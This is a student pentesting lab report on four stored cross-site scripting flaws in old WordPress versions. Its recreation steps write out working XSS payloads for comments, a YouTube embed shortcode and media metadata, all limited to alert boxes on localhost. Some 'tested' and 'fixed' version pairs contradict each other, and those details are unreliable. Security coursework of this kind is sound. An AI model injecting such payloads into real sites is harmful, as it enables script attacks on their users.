# Project 7 - WordPress Pentesting

Time spent: Approx 7 hours spent in total

> Objective: Find, analyze, recreate, and document vulnerabilities affecting an old version of WordPress

## Pentesting Report



**Exploit 1: “Upload Same Origin Method Execution”**
-	[x] Summary: Attacking the system via a user clicking on a malicious comment that alerts the user. This click was led the user to involuntarily installing a plug-in on their system.
    -	Vulnerability type: XSS
    -	Tested in version: 4.5.1
    -	Fixed in version: 4.2.8
- [x] GIF Walkthrough:	
     <img src="https://github.com/eddenk/Codepathweek7/blob/master/attack_1.gif" alt="attack_1" title="attack_1" />
- [x] Steps to recreate: 
1.	Go to any post.
2.	Paste the following as a comment:
<button onclick="fire()">Click</button>
<script>
function fire() {
open('javascript:alert("exploit 1: Same Origin Method Execution")');
}
</script>
3.	Click on the button.
4.	Alert(“exploit 1: Same Origin Method Execution”) will pop up.
-	[x] Affected source code:
      	http://localhost/wp-admin/comment.php?action=editcomment&c=9
-	CVE:   2016-4566



**Exploit 2: “Unauthenticated Stored Cross Site-Scripting (XSS)”**
-	[x] Summary: Attacking the system when a vulnerable user comes in contact on a malicious webpage that will then alert the user. 
    -	Vulnerability Type: Stored XSS
    -	Tested in version: 4.2
    -	Fixed in version: 4.2.1
-	[x] GIF Walkthrough:
    <img src="https://github.com/eddenk/Codepathweek7/blob/master/attack_2.gif" alt="attack_2" title="attack_2" />
-	[x] Steps to recreate: 
1.	Go to any post
2.	Paste the following on a comment
<a title='x onmouseover=alert(unescape(/Exploit2:%successful/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px
AAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAA…’></a>
3.	Post the comment 
4.	Once the text is visible to the user, the alert will pop up
-	[x] Affected source code:
    http://localhost/wp-admin/comment.php?action=editcomment&c=8 
-	CVE:   2015-3440




**Exploit 3: “Authenticated Stored Cross-Site Scripting (XSS) in YouTube URL Embeds**
-	[x] Summary: Attacking the system via a user clicking on a malicious link that will alert the user. Clicking this embedded “YouTube” link will send an alert to the user. 
    -	Vulnerability types: XSS
    -	Tested in version: 4.0-4.7.2
    -	Fixed in version: 4.2.13
-	[x] GIF Walkthrough:
    <img src="https://github.com/eddenk/Codepathweek7/blob/master/attack_3.gif" alt="attack_3" title="attack_3" />
-	[x] Steps to recreate: 
1.	Create new post 
2.	Inside the body of the new post insert this code

[embed src='https://youtube.com/embed/1234\x3csvg onload=alert("vulnerable!")\x3e'][/embed]

3.	Save changes to the post and see the imbedded link, click on view post 
4.	An alert window will pop up once redirected with the message “vulnerable”

-	[x] Affected source code:
     http://localhost/wp-admin/post.php?post=28&action=edit 
-	CVE:   2017-6817




**Exploit 4: “Authenticated Cross-Site Scripting via Media File Metadata”**
-	[x] Summary: 
    -	Vulnerability type: Stored XSS
    -	Tested in version: 3.6-4.7.2
    -	Fixed in version: 4.2.13
-	[x] GIF Walkthrough:
    <img src="https://github.com/eddenk/Codepathweek7/blob/master/attack_14.gif" alt="attack_4" title="attack_4" />
-	[x] Steps to recreate: 
1.	Upload a media file to WordPress containing an exploit in the form of metadata 
2.	If the image uploaded does not contain Metadata already, add it to the description of the media file on the admin console add to the description:

      "filename <script>alert("Exploit 3 Successful");</script>"

3.	 When viewing the attachment page, an alert to the user will pop up.
-	[x] Affected source code:
      	http://localhost/wp-admin/upload.php?item=31 
-	CVE:   2017-6814




## Assets

List any additional assets, such as scripts or files

## Resources

- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)

GIFs created with [LiceCap](http://www.cockos.com/licecap/).

## Notes

Describe any challenges encountered while doing the work

## License

    Copyright [yyyy] [name of copyright owner]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
